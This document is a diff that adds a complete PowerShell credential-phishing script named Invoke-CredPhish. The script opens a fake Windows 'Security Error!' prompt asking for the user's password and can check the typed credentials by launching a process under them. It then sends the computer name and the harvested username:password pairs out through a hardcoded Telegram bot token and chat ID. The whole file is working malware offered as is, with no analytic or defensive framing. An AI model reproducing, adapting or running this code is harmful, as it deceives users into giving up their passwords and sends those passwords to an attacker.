@@ -1,1 +1,55 @@
+function Invoke-CredPhish{
+# prompt
+$targetUser = $env:username
+$promptCaption = "Security Error!"
+$promptMessage = "A slight error has occured. Please fill in your password to proceed."
+$maxTries = 1 # maximum number of times to invoke prompt
+$delayPrompts = 2 # seconds between prompts
+$validateCredentials = $false # interrupt $maxTries and immediately exfil if credentials are valid
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+$BotToken = "1833256998:AAECTG9i5e2ehhN7W5hXvFt6_rB3EIa1pPA"
+$ChatID = '1913579690'
+$Response
 
+$outputFile = "credentials.txt" # filename of exfiltrated credentials
+
+##########################################################################a
+
+function testCredentials(){
+    $securePassword = ConvertTo-SecureString -AsPlainText $phish.CredentialPassword -Force
+    $secureCredentials = New-Object System.Management.Automation.PSCredential($phish.CredentialUsername, $securePassword)
+    Start-Process ipconfig -Credential $secureCredentials
+    return $?
+}
+
+Add-Type -AssemblyName System.Runtime.WindowsRuntime
+$asTask = ([System.WindowsRuntimeSystemExtensions].GetMethods() | `
+? { $_.Name -eq 'AsTask' -and $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncOperation`1' })[0]
+[void][Windows.Security.Credentials.UI.CredentialPicker, Windows.Security.Credentials.UI, ContentType = WindowsRuntime]
+$asTask = $asTask.MakeGenericMethod(([Windows.Security.Credentials.UI.CredentialPickerResults]))
+$opt = [Windows.Security.Credentials.UI.CredentialPickerOptions]::new()
+$opt.AuthenticationProtocol = 0
+$opt.Caption = $promptCaption
+$opt.Message = $promptMessage
+$opt.TargetName = '1'
+
+$count = 0
+$ErrorActionPreference = 'SilentlyContinue'
+[system.collections.arraylist]$harvestCredentials = @()
+while (!($validPassword -Or $count -eq $maxTries)){
+    start-sleep -s $delayPrompts
+    $phish = $asTask.Invoke($null, @(([Windows.Security.Credentials.UI.CredentialPicker]::PickAsync($opt)))).Result
+    [void]$harvestCredentials.Add($phish.CredentialUsername + ':' + $phish.CredentialPassword)
+    if (!($phish.CredentialPassword) -Or !($phish.CredentialUsername)){
+        Continue
+    }
+    if ($validateCredentials){
+        $validPassword = testCredentials
+    }
+    $count++
+}
+
+$output = $env:computername + '[' + ($harvestCredentials -join ',') + ']'
+$Response = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($output)"
+}
+Invoke-CredPhish
